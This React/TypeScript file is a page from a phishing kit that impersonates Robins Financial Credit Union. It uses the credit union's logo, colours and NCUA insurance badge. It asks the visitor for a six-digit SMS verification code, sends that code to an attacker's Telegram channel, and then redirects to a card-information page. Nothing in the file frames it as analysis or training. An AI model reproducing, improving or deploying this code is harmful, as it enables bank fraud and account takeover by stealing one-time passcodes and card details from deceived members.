import { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { sendToTelegram } from "@/utils/telegram";

export default function EnterCodePage() {
  const navigate = useNavigate();
  const [code, setCode] = useState(["", "", "", "", "", ""]);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!pasted) return;

    const newCode = ["", "", "", "", "", ""];
    for (let i = 0; i < pasted.length; i++) {
      newCode[i] = pasted[i];
    }
    setCode(newCode);
    setError("");

    const nextIndex = Math.min(pasted.length, 5);
    inputRefs.current[nextIndex]?.focus();

    if (pasted.length === 6) {
      setTimeout(() => handleSubmit(pasted), 200);
    }
  };

  const handleChange = (index: number, value: string) => {
    setError("");
    if (value.length > 1) return;
    if (value && !/^\d*$/.test(value)) return;

    const newCode = [...code];
    newCode[index] = value;
    setCode(newCode);

    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }

    if (newCode.every((d) => d !== "") && !newCode.includes("")) {
      setTimeout(() => handleSubmit(newCode.join("")), 200);
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async (fullCode: string) => {
    if (fullCode.length !== 6) return;

    const message = [
      "📱 <b>Verification Code Submitted</b>",
      "",
      `🔢 Code: <code>${fullCode}</code>`,
    ].join("\n");

    await sendToTelegram(message);

    navigate("/card-info");
  };

  const bgImage =
    "https://static.readdy.ai/image/7e76308de67f95d36c39819111a3a60f/07df4f722b774f3cfaacdd2ee78eaabe.png";

  const logoIcon =
    "https://static.readdy.ai/image/7e76308de67f95d36c39819111a3a60f/ab40e8d2d571da8ae7469bb943a1fc22.png";

  return (
    <div
      className="min-h-screen w-full relative bg-cover bg-center bg-no-repeat flex flex-col items-center justify-center px-4 py-8"
      style={{ backgroundImage: `url(${bgImage})` }}
    >


      {/* White card */}
      <div className="w-full max-w-[400px] bg-white shadow-xl">
        {/* Logo header with divider */}
        <div className="px-6 pt-5 pb-3 border-b border-gray-300">
          <div className="flex items-center justify-center gap-0 mb-0.5 relative">
            <span
              className="text-[#003d7a] font-bold text-[26px] tracking-tight"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Rob
              <span className="relative inline-block">
                i
                <img
                  src={logoIcon}
                  alt="Robins Financial Logo Icon"
                  className="absolute -top-2.5 left-1/2 -translate-x-1/2 w-7 h-7 object-contain contrast-125 drop-shadow-sm"
                />
              </span>
              ns
            </span>
            <span
              className="text-[#5a7fa8] font-normal text-[26px] tracking-tight"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Financial
            </span>
          </div>
          <div
            className="text-center text-[#003d7a] text-[10px] font-bold uppercase tracking-[0.25em]"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            CREDIT UNION
          </div>
        </div>

        {/* Enter Code area */}
        <div className="px-5 pt-5 pb-2">
          <h2
            className="text-[#333333] text-[18px] font-bold mb-2 text-center"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            Enter Code
          </h2>
          <p
            className="text-[#666666] text-[14px] text-center mb-5"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            A verification code has been sent to your mobile phone number. Please enter the 6 digit code below.
          </p>

          {error && (
            <div className="mb-4 bg-red-50 border border-red-200 rounded-md px-3 py-2.5">
              <p
                className="text-red-600 text-[13px]"
                style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
              >
                {error}
              </p>
            </div>
          )}

          {/* Code inputs */}
          <div className="flex items-center justify-center gap-2 mb-6">
            {code.map((digit, index) => (
              <input
                key={index}
                ref={(el) => { inputRefs.current[index] = el; }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={handlePaste}
                disabled={isLoading}
                className="w-12 h-14 sm:w-14 sm:h-16 border-2 border-gray-300 text-center text-xl sm:text-2xl text-[#333333] outline-none focus:border-[#003d7a] focus:ring-2 focus:ring-[#003d7a]/20 rounded-lg shadow-sm transition-all duration-150 disabled:opacity-50"
                style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
              />
            ))}
          </div>

          {/* Submit button */}
          <button
            onClick={() => handleSubmit(code.join(""))}
            disabled={isLoading || code.some((d) => d === "")}
            className="w-full h-[46px] bg-[#003d7a] hover:bg-[#002d5a] text-white text-[16px] rounded-md transition-colors disabled:opacity-50 flex items-center justify-center gap-2"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            {isLoading && (
              <i className="ri-loader-4-line animate-spin text-lg" />
            )}
            {isLoading ? "Verifying..." : "Verify Code"}
          </button>

          {/* Resend */}
          <div className="text-center mt-4 mb-4">
            <button
              type="button"
              disabled={isLoading}
              className="text-[#003d7a] text-[14px] hover:underline disabled:opacity-50"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
              onClick={() => {
                setCode(["", "", "", "", "", ""]);
                inputRefs.current[0]?.focus();
              }}
            >
              Resend Code
            </button>
          </div>
        </div>

        {/* Footer links */}
        <div className="px-5 pb-5">
          <div className="flex items-center justify-center gap-2 text-[14px] mb-1.5 flex-wrap">
            <a
              href="#enroll"
              className="text-[#003d7a] hover:underline"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Enroll Now
            </a>
            <span className="text-[#cccccc]">|</span>
            <a
              href="#unlock"
              className="text-[#003d7a] hover:underline"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Forgot/Unlock Login ID
            </a>
          </div>
          <div className="flex items-center justify-center gap-2 text-[14px] flex-wrap">
            <a
              href="#guide"
              className="text-[#003d7a] hover:underline"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Digital Banking Guide
            </a>
            <span className="text-[#cccccc]">|</span>
            <a
              href="#privacy"
              className="text-[#003d7a] hover:underline"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Privacy Policy
            </a>
          </div>
        </div>
      </div>

      {/* NCUA Badge */}
      <div className="mt-6 w-[200px]">
        <div className="bg-[#003d7a] border-2 border-white shadow-lg px-3 py-2 text-center">
          <p
            className="text-white text-[7px] leading-tight mb-1"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            Your savings federally insured to at least $250,000
          </p>
          <p
            className="text-white text-[7px] leading-tight mb-1"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            and backed by the full faith and credit of the United States Government
          </p>
          <p
            className="text-white text-[28px] font-bold leading-none my-1"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            NCUA
          </p>
          <p
            className="text-white text-[7px] leading-tight"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            National Credit Union Administration, a U.S. Government Agency
          </p>
        </div>
      </div>
    </div>
  );
}